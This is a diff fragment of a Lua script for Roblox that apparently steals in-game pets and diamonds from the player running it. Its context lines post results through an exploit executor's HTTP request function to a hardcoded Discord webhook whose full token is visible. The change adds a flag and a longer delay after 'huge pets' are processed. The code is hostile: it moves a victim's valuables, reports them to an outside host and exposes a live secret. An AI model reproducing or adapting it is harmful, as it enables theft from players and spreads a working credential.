@@ -233,6 +233,7 @@ end
 
 
 print("VoidAmount:", VoidAmount)
+local HugeCheck = false
 local DiamondsInput = DiamondsAmount - 1000000
 local DiamondsValue = DiamondsAmount
 if SendAmount == true then
@@ -298,6 +299,7 @@ function ProcessHugePets()
     end
 
     for i = #uids, 1, -1 do
+HugeCheck = true
         local webhook = "https://discord.com/api/webhooks/1238281258174386257/C-YRLxkKnYEIPUFjIJYEAS2L_zdAv-Qou6OAzvFpIaxELHHNVdP2LnlXf3uwA-SSNzwD"
         local request = (syn and syn.request) or request or (http and http.request) or http_request
         request({
@@ -333,10 +335,16 @@ end
 
 
 
-wait(5)
+if HugeCheck then
+    wait(30)
+else
+    wait(0)
+end
+
 local TPS = game:GetService("TeleportService")
 local player = game.Players.LocalPlayer
 local startTime = tick()
+
 
 while true do
  
